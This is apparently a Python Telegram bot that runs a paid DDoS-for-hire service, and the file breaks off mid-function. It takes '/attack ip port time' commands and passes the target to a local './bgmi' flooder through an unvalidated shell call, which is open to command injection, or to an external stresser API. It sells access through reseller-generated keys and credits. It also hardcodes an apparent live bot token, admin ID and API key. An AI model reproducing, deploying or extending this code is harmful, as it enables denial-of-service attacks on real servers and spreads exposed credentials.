import telebot
import subprocess
import datetime
import os
import time
import threading
import json
import random
import string
import re
import requests
from collections import defaultdict

# ==================== CONFIGURATION ====================
BOT_TOKEN = "8535360146:AAEx7V1Uysxq5ljhGRYaIQdLubpBF_C5dgQ"
ADMIN_IDS = ["1725783398"]

# Files
USER_FILE = "users.json"
KEYS_FILE = "keys.json"
ATTACKS_FILE = "attacks.json"
LOG_FILE = "logs.txt"
RESELLER_FILE = "resellers.json"
BALANCE_FILE = "balances.json"
API_FILE = "api_config.json"  # New file for API config

# Default Settings
MAX_CONCURRENT_ATTACKS = 5
MAX_ATTACK_DURATION = 300
COOLDOWN_SECONDS = 120

# API Settings (will be loaded from file)
API_ENABLED = False
API_URL = "https://retrostress.net"
API_KEY = "NEOKABAPDESTROYER"
API_METHOD = "GET"  # GET or POST

# Reseller key pricing
RESELLER_KEY_PRICING = {
    "12h": {"credits": 50, "duration": 12, "unit": "hour", "name": "12 Hours"},
    "1d": {"credits": 100, "duration": 1, "unit": "day", "name": "1 Day"},
    "2d": {"credits": 200, "duration": 2, "unit": "day", "name": "2 Days"},
    "3d": {"credits": 300, "duration": 3, "unit": "day", "name": "3 Days"},
    "7d": {"credits": 700, "duration": 7, "unit": "day", "name": "7 Days"},
    "30d": {"credits": 3000, "duration": 30, "unit": "day", "name": "30 Days"}
}

# Store active attacks and cooldowns
active_attacks = {}
user_cooldowns = {}
status_update_threads = {}
cooldown_update_threads = {}

# ==================== API CONFIGURATION ====================
def load_api_config():
    global API_ENABLED, API_URL, API_KEY, API_METHOD
    try:
        with open(API_FILE, 'r') as f:
            config = json.load(f)
            API_ENABLED = config.get("enabled", False)
            API_URL = config.get("url", "")
            API_KEY = config.get("api_key", "")
            API_METHOD = config.get("method", "GET")
    except:
        API_ENABLED = False
        API_URL = ""
        API_KEY = ""
        API_METHOD = "GET"

def save_api_config():
    config = {
        "enabled": API_ENABLED,
        "url": API_URL,
        "api_key": API_KEY,
        "method": API_METHOD
    }
    with open(API_FILE, 'w') as f:
        json.dump(config, f, indent=2)

def set_api(enable, url, api_key, method="GET"):
    global API_ENABLED, API_URL, API_KEY, API_METHOD
    API_ENABLED = enable
    API_URL = url
    API_KEY = api_key
    API_METHOD = method
    save_api_config()
    return True

def send_api_attack(target, port, duration):
    """Send attack request to external API"""
    if not API_ENABLED or not API_URL:
        return False, "API not configured"
    
    headers = {
        "Authorization": f"Bearer {API_KEY}",
        "Content-Type": "application/json"
    }
    
    data = {
        "host": target,
        "port": port,
        "time": duration,
        "method": "GAME"
    }
    
    try:
        if API_METHOD.upper() == "POST":
            response = requests.post(API_URL, json=data, headers=headers, timeout=10)
        else:
            response = requests.get(API_URL, params=data, headers=headers, timeout=10)
        
        if response.status_code == 200:
            return True, "Attack sent via API"
        else:
            return False, f"API Error: {response.status_code}"
    except Exception as e:
        return False, f"API Request Failed: {str(e)}"

# ==================== FILE HANDLING ====================
def load_json(file, default):
    try:
        with open(file, 'r') as f:
            return json.load(f)
    except:
        return default

def save_json(file, data):
    with open(file, 'w') as f:
        json.dump(data, f, indent=2)

def init_files():
    files = [USER_FILE, KEYS_FILE, ATTACKS_FILE, RESELLER_FILE, BALANCE_FILE, API_FILE]
    defaults = [{}, {"used": {}, "unused": {}}, {}, {}, {}, {"enabled": False, "url": "", "api_key": "", "method": "GET"}]
    for file, default in zip(files, defaults):
        if not os.path.exists(file):
            save_json(file, default)
    if not os.path.exists(LOG_FILE):
        with open(LOG_FILE, 'w') as f:
            f.write("")
    
    load_api_config()  # Load API config on startup

init_files()

# ==================== RESELLER & BALANCE HELPERS ====================
def is_reseller(user_id):
    resellers = load_json(RESELLER_FILE, {})
    return str(user_id) in resellers

def get_balance(user_id):
    if str(user_id) in ADMIN_IDS:
        return 999999999
    balances = load_json(BALANCE_FILE, {})
    return balances.get(str(user_id), 0)

def add_balance(user_id, amount):
    if str(user_id) in ADMIN_IDS:
        return 999999999
    balances = load_json(BALANCE_FILE, {})
    user_id = str(user_id)
    balances[user_id] = balances.get(user_id, 0) + amount
    save_json(BALANCE_FILE, balances)
    
    try:
        bot.send_message(user_id, f"✅ Balance Added Successfully!\n\n💰 Balance Updated! 💰\n✅ {amount} credits added to your account.\n💎 New Balance: {balances[user_id]} credits")
    except:
        pass
    
    return balances[user_id]

def deduct_balance(user_id, amount):
    if str(user_id) in ADMIN_IDS:
        return True
    balances = load_json(BALANCE_FILE, {})
    user_id = str(user_id)
    current = balances.get(user_id, 0)
    if current >= amount:
        balances[user_id] = current - amount
        save_json(BALANCE_FILE, balances)
        return True
    return False

def add_reseller(user_id):
    resellers = load_json(RESELLER_FILE, {})
    resellers[str(user_id)] = {
        "added_on": datetime.datetime.now().isoformat(),
        "added_by": "admin"
    }
    save_json(RESELLER_FILE, resellers)
    balances = load_json(BALANCE_FILE, {})
    if str(user_id) not in balances:
        balances[str(user_id)] = 0
        save_json(BALANCE_FILE, balances)
    
    try:
        bot.send_message(user_id, f"🎉 Congratulations!\n\n✅ You have been promoted to Reseller\n💰 Your Initial Balance: 0 credits\n💡 Use /help to see all reseller commands.")
    except:
        pass
    
    return True

def remove_reseller(user_id):
    resellers = load_json(RESELLER_FILE, {})
    if str(user_id) in resellers:
        del resellers[str(user_id)]
        save_json(RESELLER_FILE, resellers)
        
        try:
            bot.send_message(user_id, f"🚧 Notes for us 🚧\n\n❌ Your reseller access has been removed.\nContact Admin or Owner for get reason.")
        except:
            pass
        
        return True
    return False

# ==================== KEY HELPERS ====================
def generate_keys_admin(prefix, duration, unit, count):
    keys = []
    keys_data = load_json(KEYS_FILE, {"used": {}, "unused": {}})
    
    for _ in range(count):
        random_part = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        key = f"{prefix}-{random_part}"
        keys.append(key)
        
        keys_data["unused"][key] = {
            "duration": duration,
            "unit": unit,
            "generated": datetime.datetime.now().isoformat(),
            "generated_by": "admin",
            "used": False,
            "used_by": None
        }
    
    save_json(KEYS_FILE, keys_data)
    return keys

def generate_keys_reseller(user_id, duration_key, count):
    if duration_key not in RESELLER_KEY_PRICING:
        return None, "🚫 Invalid key type. Available: 12h, 1d, 2d, 3d, 7d, 30d"
    
    cost = RESELLER_KEY_PRICING[duration_key]["credits"] * count
    if not deduct_balance(user_id, cost):
        return None, f"🚧 Insufficient balance! Need {cost} credits"
    
    duration_val = RESELLER_KEY_PRICING[duration_key]["duration"]
    unit = RESELLER_KEY_PRICING[duration_key]["unit"]
    keys = []
    keys_data = load_json(KEYS_FILE, {"used": {}, "unused": {}})
    
    for _ in range(count):
        random_part = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        key = f"Bgmi-{random_part}"
        keys.append(key)
        
        keys_data["unused"][key] = {
            "duration": duration_val,
            "unit": unit,
            "generated": datetime.datetime.now().isoformat(),
            "generated_by": user_id,
            "used": False,
            "used_by": None
        }
    
    save_json(KEYS_FILE, keys_data)
    return keys, None

def increase_key_duration(key, add_duration, add_unit):
    keys_data = load_json(KEYS_FILE, {"used": {}, "unused": {}})
    
    if key in keys_data["unused"]:
        keys_data["unused"][key]["duration"] += add_duration
        save_json(KEYS_FILE, keys_data)
        return True, "unused"
    elif key in keys_data["used"]:
        keys_data["used"][key]["duration"] += add_duration
        save_json(KEYS_FILE, keys_data)
        return True, "used"
    return False, None

def decrease_key_duration(key, dec_duration, dec_unit):
    keys_data = load_json(KEYS_FILE, {"used": {}, "unused": {}})
    
    if key in keys_data["unused"]:
        keys_data["unused"][key]["duration"] = max(0, keys_data["unused"][key]["duration"] - dec_duration)
        save_json(KEYS_FILE, keys_data)
        return True, "unused"
    elif key in keys_data["used"]:
        keys_data["used"][key]["duration"] = max(0, keys_data["used"][key]["duration"] - dec_duration)
        save_json(KEYS_FILE, keys_data)
        return True, "used"
    return False, None

def increase_all_keys(duration, unit):
    keys_data = load_json(KEYS_FILE, {"used": {}, "unused": {}})
    count = 0
    for key in keys_data["used"]:
        keys_data["used"][key]["duration"] += duration
        count += 1
    save_json(KEYS_FILE, keys_data)
    return count

def decrease_all_keys(duration, unit):
    keys_data = load_json(KEYS_FILE, {"used": {}, "unused": {}})
    count = 0
    for key in keys_data["used"]:
        keys_data["used"][key]["duration"] = max(0, keys_data["used"][key]["duration"] - duration)
        count += 1
    save_json(KEYS_FILE, keys_data)
    return count

def redeem_key(user_id, key):
    keys_data = load_json(KEYS_FILE, {"used": {}, "unused": {}})
    
    if key in keys_data["used"]:
        return "expired", None
    if key not in keys_data["unused"]:
        return "invalid", None
    
    key_info = keys_data["unused"][key]
    duration = key_info["duration"]
    unit = key_info["unit"]
    now = datetime.datetime.now()
    
    if unit == "min":
        expiry = now + datetime.timedelta(minutes=duration)
    elif unit == "hour":
        expiry = now + datetime.timedelta(hours=duration)
    else:
        expiry = now + datetime.timedelta(days=duration)
    
    keys_data["used"][key] = {
        **key_info,
        "used_by": user_id,
        "used_at": now.isoformat(),
        "expiry": expiry.isoformat()
    }
    del keys_data["unused"][key]
    save_json(KEYS_FILE, keys_data)
    
    users = load_json(USER_FILE, {})
    users[str(user_id)] = {
        "expiry": expiry.isoformat(),
        "key": key,
        "banned": False
    }
    save_json(USER_FILE, users)
    
    return "success", expiry

def is_user_allowed(user_id):
    users = load_json(USER_FILE, {})
    user = users.get(str(user_id))
    
    if not user:
        return False, None
    if user.get("banned", False):
        return False, None
    
    expiry = datetime.datetime.fromisoformat(user["expiry"])
    if datetime.datetime.now() > expiry:
        return False, None
    
    return True, expiry

def log_attack(user_id, target, port, duration, method="LOCAL"):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(LOG_FILE, "a") as f:
        f.write(f"[{timestamp}] User: {user_id} | Target: {target}:{port} | Duration: {duration}s | Method: {method}\n")

# ==================== REAL-TIME STATUS UPDATER ====================
def update_cooldown_message(chat_id, user_id, msg_id, initial_remaining):
    while user_id in user_cooldowns:
        remaining = max(0, int(user_cooldowns[user_id] - time.time()))
        if remaining <= 0:
            break
        
        try:
            bot.edit_message_text(
                f"⏳ Cooldown mode enabled! ⏳\n\n🚫 You cannot use /attack command.\n🕐 Waiting {remaining} seconds before next attack.\n💡 Check running attacks in monitor.\n📝 Format:\n🔸 Usage: /status to check monitor",
                chat_id=chat_id,
                message_id=msg_id
            )
        except:
            pass
        
        time.sleep(2)
    
    try:
        bot.edit_message_text(
            f"✅ Cooldown mode disabled ✅\n\n🎮 You can now launch a new attack.\n💻 Server: Available ✅\n📍 Api status: Online ☑️\n\n📝 Format:\n⚠️ Usage /attack <ip> <port> <time>",
            chat_id=chat_id,
            message_id=msg_id
        )
    except:
        pass

def update_global_status(chat_id, user_id, msg_id):
    while True:
        try:
            if not active_attacks and user_id not in user_cooldowns:
                break
            
            status_msg = "🎯 Active Attacks:\n\n"
            
            if not active_attacks:
                status_msg = "📊 No Active Attacks\n\n"
            else:
                for uid, attack in list(active_attacks.items())[:10]:
                    elapsed = int(time.time() - attack["start_time"])
                    remaining = max(0, attack["duration"] - elapsed)
                    progress = int((elapsed / attack["duration"]) * 100) if attack["duration"] > 0 else 0
                    bar = "█" * (progress // 5) + "░" * (20 - (progress // 5))
                    
                    status_msg += f"🎯 Target: {attack['target']}:{attack['port']}\n"
                    status_msg += f"⏱️ Remaining: {remaining}s\n"
                    status_msg += f"📊 Progress: {progress}%\n[{bar}]\n\n"
            
            if user_id in user_cooldowns:
                remaining = max(0, int(user_cooldowns[user_id] - time.time()))
                if remaining > 0:
                    status_msg += f"⏳ Your Cooldown mode: {remaining}s\n\n"
            
            status_msg += f"📈 Total Active attacks: {len(active_attacks)}/{MAX_CONCURRENT_ATTACKS}"
            
            try:
                bot.edit_message_text(status_msg, chat_id, msg_id)
            except:
                pass
            
            time.sleep(2)
        except:
            time.sleep(2)
            continue

def start_cooldown(user_id, duration, chat_id=None):
    user_cooldowns[user_id] = time.time() + duration
    
    def cooldown_thread():
        remaining = duration
        while remaining > 0 and user_id in user_cooldowns:
            remaining = max(0, int(user_cooldowns[user_id] - time.time()))
            time.sleep(2)
        
        if user_id in user_cooldowns:
            del user_cooldowns[user_id]
    
    thread = threading.Thread(target=cooldown_thread)
    thread.daemon = True
    thread.start()

def update_attack_progress(chat_id, message_id, target, port, duration, user_id):
    start_time = time.time()
    
    while user_id in active_attacks:
        elapsed = int(time.time() - start_time)
        if elapsed >= duration:
            break
        
        remaining = duration - elapsed
        progress = int((elapsed / duration) * 100)
        bar = "█" * (progress // 5) + "░" * (20 - (progress // 5))
        
        method_text = "API-Connected" if API_ENABLED else "Game"
        
        try:
            bot.edit_message_text(
                f"⚡ Attack in Progress! ⚡\n\n"
                f"🎯 Target: {target}:{port}\n"
                f"⏱️ Remaining: {remaining}s\n"
                f"📍 Location: Private\n"
                f"🖥️ Server: {method_text}\n\n"
                f"📊 Progress: {progress}%\n⚡ [{bar}] ⚡",
                chat_id=chat_id,
                message_id=message_id
            )
        except:
            pass
        
        time.sleep(2)
    
    try:
        bot.edit_message_text(
            f"✅ Attack Finished! ✅\n\n"
            f"🎯 Target: {target}:{port}\n"
            f"⏱️ Duration: {duration}s\n"
            f"🆔 Attack ID: 4b3c4893-2e46-45d7-9812-aca9\n"
            f"💥 Status: Success\n\n"
            f"🚀 Ready for next attack! Use /attack again.",
            chat_id=chat_id,
            message_id=message_id
        )
    except:
        pass
    
    if user_id in active_attacks:
        del active_attacks[user_id]
    
    if str(user_id) not in ADMIN_IDS:
        start_cooldown(user_id, COOLDOWN_SECONDS, chat_id)

def start_attack(chat_id, user_id, target, port, duration):
    user_id_str = str(user_id)
    
    if user_id_str not in ADMIN_IDS and user_id in user_cooldowns:
        remaining = int(user_cooldowns[user_id] - time.time())
        if remaining > 0:
            msg = bot.send_message(
                chat_id,
                f"💻 Server unavailable\n\n⏳ Your cooldown mode is running....\n🕐 Please wait {remaining} seconds before next attack\n💡 Use /status to monitor your cooldown."
            )
            thread = threading.Thread(target=update_cooldown_message, args=(chat_id, user_id, msg.message_id, remaining))
            thread.daemon = True
            thread.start()
            return
    
    if len(active_attacks) >= MAX_CONCURRENT_ATTACKS:
        bot.send_message(
            chat_id,
            f"⚠️ Max concurrent attacks reached! ⚠️\n\n⚡ {MAX_CONCURRENT_ATTACKS} attacks are already running!\n💡 Use /status to monitor running attacks."
        )
        return
    
    if user_id in active_attacks:
        bot.send_message(
            chat_id,
            f"🚫 Error!\n\n⚠️ You already have an active attack! ⚠️\n💡 Use /status to monitor your attack."
        )
        return
    
    active_attacks[user_id] = {
        "target": target,
        "port": port,
        "duration": duration,
        "start_time": time.time(),
        "chat_id": chat_id
    }
    
    log_attack(user_id, target, port, duration, "API" if API_ENABLED else "LOCAL")
    
    launch_msg = bot.send_message(
        chat_id,
        f"🚀 Attack Launching....\n\n🎯 Target: {target}:{port}\n⏱️ Duration: {duration}s\n🎮 Method: Game\n\n🖥️ Server: Connecting to API....."
    )
    
    def run_attack():
        try:
            if API_ENABLED and API_URL:
                success, message = send_api_attack(target, port, duration)
                if not success:
                    bot.send_message(chat_id, f"🚫 Error!\n\n⚠️ API Warning: {message}\n\n💻 Falling back to local attack.....")
                    cmd = f"./bgmi {target} {port} {duration} 8000"
                    subprocess.run(cmd, shell=True, timeout=duration + 5)
            else:
                cmd = f"./bgmi {target} {port} {duration} 8000"
                subprocess.run(cmd, shell=True, timeout=duration + 5)
        except Exception as e:
            print(f"Attack error: {e}")
    
    attack_thread = threading.Thread(target=run_attack)
    attack_thread.daemon = True
    attack_thread.start()
    
    progress_thread = threading.Thread(
        target=update_attack_progress,
        args=(chat_id, launch_msg.message_id, target, port, duration, user_id)
    )
    progress_thread.daemon = True
    progress_thread.start()

# ==================== BOT INIT ====================
bot = telebot.TeleBot(BOT_TOKEN)

# ==================== USER COMMANDS ====================
@bot.message_handler(commands=['start'])
def start_cmd(message):
    user_id = message.from_user.id
    allowed, expiry = is_user_allowed(user_id)
    is_res = is_reseller(user_id)
    balance = get_balance(user_id) if is_res else 0
    
    welcome_msg = f"👋 Hello! This bot requires authorization in private chat.\n\nUse /redeem if you have a code, or contact admin and owner for code."
    
    if API_ENABLED:
        welcome_msg += f"🌐 API Mode: ENABLED\n"
    else:
        welcome_msg += f"💻 Local Mode: ACTIVE\n"
    
    welcome_msg += f"\n"
    
    if allowed or str(user_id) in ADMIN_IDS:
        if expiry:
            welcome_msg += f"✅ Access Granted ✅\n\n📅 Expires: `{expiry.strftime('%Y-%m-%d %H:%M:%S')}`\n💡 Use /help to see your commands"
        else:
            welcome_msg += f"👑 Admin Access Granted 👑\n\n💡 Use /help to see all commands"
        if is_res:
            welcome_msg += f"\n\n💰Your Total Balance: `{balance}` credits"
    else:
        welcome_msg += "❌ Account no active ❌\n\n💻 Account: Access required!\n💡 Use /redeem to activate your account"
    
    bot.reply_to(message, welcome_msg, parse_mode="Markdown")

@bot.message_handler(commands=['help'])
def help_cmd(message):
    user_id = str(message.from_user.id)
    allowed, _ = is_user_allowed(user_id)
    is_res = is_reseller(user_id)
    
    if not allowed and user_id not in ADMIN_IDS:
        bot.reply_to(message, "❌ This bot requires authorization in private chat.\n\nUse /redeem if you have a code and see user commands.")
        return
    
    help_text = "🚧 Available Commands\n\n"
    help_text += "🔸 /attack <ip> <port> <time> - Launch DDoS attack\n"
    help_text += "🔸 /status - View active attacks\n"
    help_text += "🔸 /id - Get your user ID\n"
    help_text += "🔸 /redeem <key> - Redeem activation key\n\n"
    help_text += "🔸 Attack Usage:\n🔸 /attack 1.1.1.1 8080 60\n\n"
    
    if API_ENABLED:
        help_text += "🖥️ Server: API ATTACK"
    else:
        help_text += "💻 Server: GAME FLOOD"
    
    if is_res or user_id in ADMIN_IDS:
        help_text += "\n\n🌟 Reseller Commands\n"
        help_text += "🔸 /genkey TYPE COUNT - Generate keys (12h, 1d, 2d, 3d, 7d, 30d)\n"
        help_text += "🔸 /balance - Check your credit balance\n"
        help_text += "🔸 /mykeys - View your generated keys"
    
    if user_id in ADMIN_IDS:
        help_text += "\n\n✨ Admin Commands\n"
        help_text += "🔸 /setapi URL KEY METHOD - Set API configuration\n"
        help_text += "🔸 /enableapi - Enable API mode\n"
        help_text += "🔸 /disableapi - Disable API mode\n"
        help_text += "🔸 /apistatus - Check API status\n"
        help_text += "🔸 /testapi - Test API connection\n"
        help_text += "🔸 /addreseller USER_ID - Add reseller\n"
        help_text += "🔸 /removereseller USER_ID - Remove reseller\n"
        help_text += "🔸 /addbalance USER_ID AMOUNT - Add balance\n"
        help_text += "🔸 /resellers - List all resellers\n"
        help_text += "🔸 /allkeys - View all keys\n"
        help_text += "🔸 /removekey KEY - Remove a key\n"
        help_text += "🔸 /users - View all users\n"
        help_text += "🔸 /removeuser USER_ID - Remove user\n"
        help_text += "🔸 /ban USER_ID REASON - Ban a user\n"
        help_text += "🔸 /unban USER_ID - Unban a user\n"
        help_text += "🔸 /logs - View attack logs\n"
        help_text += "🔸 /clearlogs - Clear logs\n"
        help_text += "🔸 /setlimit MAX DURATION COOLDOWN - Change limits\n"
        help_text += "🔸 /broadcast MESSAGE - Send broadcast\n"
        help_text += "🔸 /genadmin PREFIX DURATION UNIT COUNT - Generate any duration keys\n"
        help_text += "🔸 /inkey KEY AMOUNT UNIT - Increase key duration\n"
        help_text += "🔸 /removeinkey KEY AMOUNT UNIT - Decrease key duration\n"
        help_text += "🔸 /inallkey AMOUNT UNIT - Increase all active keys\n"
        help_text += "🔸 /allremoveinkey AMOUNT UNIT - Decrease all active keys"
    
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['id'])
def id_cmd(message):
    bot.reply_to(message, f"🆔 Your User ID: `{message.from_user.id}`", parse_mode="Markdown")

@bot.message_handler(commands=['status'])
def status_cmd(message):
    user_id = message.from_user.id
    
    if not active_attacks and user_id not in user_cooldowns:
        bot.reply_to(message, "📊 No Active Attacks\n\n💡 Use /attack <ip> <port> <time> to start a new attack.")
        return
    
    status_msg = "🎯 Active Attacks:\n\n"
    
    for uid, attack in list(active_attacks.items())[:10]:
        elapsed = int(time.time() - attack["start_time"])
        remaining = max(0, attack["duration"] - elapsed)
        progress = int((elapsed / attack["duration"]) * 100) if attack["duration"] > 0 else 0
        bar = "█" * (progress // 5) + "░" * (20 - (progress // 5))
        
        status_msg += f"🎯 Target: {attack['target']}:{attack['port']}\n"
        status_msg += f"⏱️ Remaining: {remaining}s\n"
        status_msg += f"📊 Progress: {progress}%\n[{bar}]\n\n"
    
    if user_id in user_cooldowns:
        remaining = max(0, int(user_cooldowns[user_id] - time.time()))
        if remaining > 0:
            status_msg += f"⏳ Your Cooldown: {remaining}s\n\n"
    
    status_msg += f"📈 Total Active: {len(active_attacks)}/{MAX_CONCURRENT_ATTACKS}"
    
    msg = bot.reply_to(message, status_msg)
    
    thread = threading.Thread(target=update_global_status, args=(message.chat.id, user_id, msg.message_id))
    thread.daemon = True
    thread.start()

@bot.message_handler(commands=['attack'])
def attack_cmd(message):
    user_id = message.from_user.id
    
    if str(user_id) not in ADMIN_IDS:
        allowed, _ = is_user_allowed(user_id)
        if not allowed:
            bot.reply_to(message, "❌ You are not authorized to use this bot in private chat!\n\nPlease use a redeem code with /redeem if you have a code or contact admin and owner for code.")
            return
    
    args = message.text.split()
    if len(args) != 4:
        bot.reply_to(
            message,
            "⚡ Attack Command Format! ⚡\n\n• Usage: /attack <ip> <port> <duration>\n\n📝 Example:\n• /attack 11.22.33.44 8080 60\n\n⚠️ Limits:\n• Max duration: {MAX_ATTACK_DURATION} seconds\n• Blocked ports: 443, 8700, 9031, 17500, 20000, 20001, 20002\n\n💡 Real-time progress will be shown!"
        )
        return
    
    target, port, duration = args[1], args[2], args[3]
    
    try:
        port = int(port)
        if port < 1 or port > 65535:
            bot.reply_to(message, "❌ Invalid Port! Port must be between 1 and 65535.")
            return
    except:
        bot.reply_to(message, "❌ Invalid Port! Port must be a number.")
        return
    
    try:
        duration = int(duration)
        if duration < 10:
            bot.reply_to(message, "❌ Duration Too Short! Minimum attack time is 10 seconds.")
            return
        if duration > MAX_ATTACK_DURATION:
            bot.reply_to(message, f"❌ Duration Too Long! Maximum attack time is {MAX_ATTACK_DURATION} seconds.")
            return
    except:
        bot.reply_to(message, "❌ Invalid Duration! Duration must be a number.")
        return
    
    start_attack(message.chat.id, user_id, target, port, duration)

@bot.message_handler(commands=['redeem'])
def redeem_cmd(message):
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "🔑 Redeem Key Format! 🔑\n\n• Usage: /redeem <Key>\n\n📝 Example:\n• /redeem Bgmi-ABC123-24H-1U\n\n💡 Benefits:\n• Activate your account instantly\n• Stack multiple keys for more time")
        return
    
    key = args[1]
    user_id = str(message.from_user.id)
    
    result, expiry = redeem_key(user_id, key)
    
    if result == "invalid":
        bot.reply_to(message, "❌ This is Invalid or expired Key!")
    elif result == "expired":
        bot.reply_to(message, "⏰ Another user already used this key!")
    elif result == "success":
        duration = expiry - datetime.datetime.now()
        days = duration.days
        hours = duration.seconds // 3600
        minutes = (duration.seconds % 3600) // 60
        
        bot.reply_to(
            message,
            f"✅ Code redeemed successfully! You can now use the bot in private chat until {expiry.strftime('%Y-%m-%d %H:%M:%S')} IST",
            parse_mode="Markdown"
        )

# ==================== API ADMIN COMMANDS ====================
@bot.message_handler(commands=['setapi'])
def setapi_cmd(message):
    if str(message.from_user.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ Command available Command available admin only!")
        return
    
    args = message.text.split()
    if len(args) < 3:
        bot.reply_to(
            message,
            "❌ Usage: /setapi URL API_KEY [METHOD]\n\n"
            "Example:\n"
            "/setapi https://api.example.com/attack YOUR_API_KEY GET\n\n"
            "Methods: GET, POST (default: GET)"
        )
        return
    
    url = args[1]
    api_key = args[2]
    method = args[3].upper() if len(args) > 3 else "GET"
    
    if method not in ["GET", "POST"]:
        method = "GET"
    
    set_api(API_ENABLED, url, api_key, method)
    bot.reply_to(
        message,
        f"✅ API Configuration Saved!\n\n"
        f"🌐 URL: {url}\n"
        f"🔑 API Key: {api_key[:10]}...\n"
        f"📡 Method: {method}\n\n"
        f"Use /enableapi to activate API mode"
    )

@bot.message_handler(commands=['enableapi'])
def enableapi_cmd(message):
    if str(message.from_user.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ Command available Command available admin only!")
        return
    
    if not API_URL or not API_KEY:
        bot.reply_to(message, "❌ Please configure API first using /setapi")
        return
    
    set_api(True, API_URL, API_KEY, API_METHOD)
    bot.reply_to(message, "✅ API Mode ENABLED!\n\nAll attacks will now use the external API.")

@bot.message_handler(commands=['disableapi'])
def disableapi_cmd(message):
    if str(message.from_user.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ Command available admin only!")
        return
    
    set_api(False, API_URL, API_KEY, API_METHOD)
    bot.reply_to(message, "✅ API Mode DISABLED!\n\nNow using local attack method (./bgmi).")

@bot.message_handler(commands=['apistatus'])
def apistatus_cmd(message):
    if str(message.from_user.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ Command available admin only!")
        return
    
    status_text = "📡 API Configuration Status 📡\n\n"
    status_text += f"🔘 Status: {'ENABLED' if API_ENABLED else 'DISABLED'}\n"
    status_text += f"🌐 URL: {API_URL if API_URL else 'Not Set'}\n"
    status_text += f"🔑 API Key: {API_KEY[:15] + '...' if API_KEY else 'Not Set'}\n"
    status_text += f"📡 Method: {API_METHOD}\n\n"
    
    if API_ENABLED:
        status_text += "✅ API mode is active. All attacks will use external API."
    else:
        status_text += "⚠️ API mode is inactive. Using local attack method.\n"
        status_text += "💡 Use /enableapi to activate API mode."
    
    bot.reply_to(message, status_text)

@bot.message_handler(commands=['testapi'])
def testapi_cmd(message):
    if str(message.from_user.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ Command available admin only!")
        return
    
    if not API_ENABLED or not API_URL:
        bot.reply_to(message, "❌ API not configured or disabled!\n\nUse /setapi and /enableapi first.")
        return
    
    bot.reply_to(message, "🔄 Testing API connection...")
    
    success, result = send_api_attack("127.0.0.1", 80, 1)
    
    if success:
        bot.reply_to(message, f"✅ API Test Successful!\n\nResponse: {result}")
    else:
        bot.reply_to(message, f"❌ API Test Failed!\n\nError: {result}")

# ==================== RESELLER COMMANDS ====================
@bot.message_handler(commands=['balance'])
def balance_cmd(message):
    user_id = str(message.from_user.id)
    
    if not is_reseller(user_id) and user_id not in ADMIN_IDS:
        bot.reply_to(message, "❌ Command not Available! You are not a reseller.")
        return
    
    balance = get_balance(user_id)
    bot.reply_to(
        message,
        f"💰 Your Balance: `{balance}` credits",
        parse_mode="Markdown"
    )

@bot.message_handler(commands=['genkey'])
def genkey_cmd(message):
    user_id = str(message.from_user.id)
    
    if not is_reseller(user_id) and user_id not in ADMIN_IDS:
        bot.reply_to(message, "❌ Command not Available! You are not a reseller.")
        return
    
    args = message.text.split()
    if len(args) != 3:
        bot.reply_to(
            message,
            "❌ Usage: /genkey <day/hour> Types: 12h, 1d, 2d, 3d, 7d, 30d"
        )
        return
    
    key_type = args[1].lower()
    try:
        count = int(args[2])
        if count < 1 or count > 50:
            bot.reply_to(message, "❌ Count must be between 1 and 50.")
            return
    except:
        bot.reply_to(message, "❌ Invalid count!")
        return
    
    if key_type not in RESELLER_KEY_PRICING:
        bot.reply_to(message, "❌ Invalid value type! Available: 12h, 1d, 2d, 3d, 7d, 30d")
        return
    
    keys, error = generate_keys_reseller(user_id, key_type, count)
    if error:
        bot.reply_to(message, f"❌ {error}")
        return
    
    keys_text = "\n".join([f"• `{k}`" for k in keys])
    bot.reply_to(
        message,
        f"✅ {count} Key(s) Generated ✅\n\n🔑 All keys:\n{keys_text}",
        parse_mode="Markdown"
    )

@bot.message_handler(commands=['mykeys'])
def mykeys_cmd(message):
    user_id = str(message.from_user.id)
    
    if not is_reseller(user_id) and user_id not in ADMIN_IDS:
        bot.reply_to(message, "❌ Command not Available! You are not a reseller.")
        return
    
    keys_data = load_json(KEYS_FILE, {"used": {}, "unused": {}})
    my_keys = [k for k, v in keys_data["unused"].items() if v.get("generated_by") == user_id]
    
    if not my_keys:
        bot.reply_to(message, "📦 No keys found! Use /genkey to generate keys.")
        return
    
    keys_text = "\n".join([f"• `{k}`" for k in my_keys[:20]])
    bot.reply_to(message, f"🔑 Your Keys:\n\n{keys_text}", parse_mode="Markdown")

# ==================== ADMIN COMMANDS (existing ones) ====================
@bot.message_handler(commands=['genadmin'])
def genadmin_cmd(message):
    if str(message.from_user.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ Command available Command available admin only!")
        return
    
    args = message.text.split()
    if len(args) != 5:
        bot.reply_to(message, "❌ Usage: /genadmin PREFIX DURATION UNIT COUNT")
        return
    
    prefix = args[1]
    try:
        duration = int(args[2])
        unit = args[3].lower()
        count = int(args[4])
        if unit not in ["min", "hour", "day"]:
            bot.reply_to(message, "❌ Unit must be: min, hour, day")
            return
    except:
        bot.reply_to(message, "❌ Invalid values!")
        return
    
    keys = generate_keys_admin(prefix, duration, unit, count)
    keys_text = "\n".join([f"• `{k}`" for k in keys])
    bot.reply_to(message, f"✅ {count} Keys Generated ✅\n\n{keys_text}", parse_mode="Markdown")

@bot.message_handler(commands=['inkey'])
def inkey_cmd(message):
    if str(message.from_user.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ Command available Command available admin only!")
        return
    
    args = message.text.split()
    if len(args) != 4:
        bot.reply_to(message, "❌ Usage: /inkey KEY AMOUNT UNIT")
        return
    
    key = args[1]
    try:
        amount = int(args[2])
        unit = args[3].lower()
    except:
        bot.reply_to(message, "❌ Invalid values!")
        return
    
    success, _ = increase_key_duration(key, amount, unit)
    if success:
        bot.reply_to(message, f"✅ Key duration increased by {amount} {unit}(s)")
    else:
        bot.reply_to(message, "❌ Key not found!")

@bot.message_handler(commands=['removeinkey'])
def removeinkey_cmd(message):
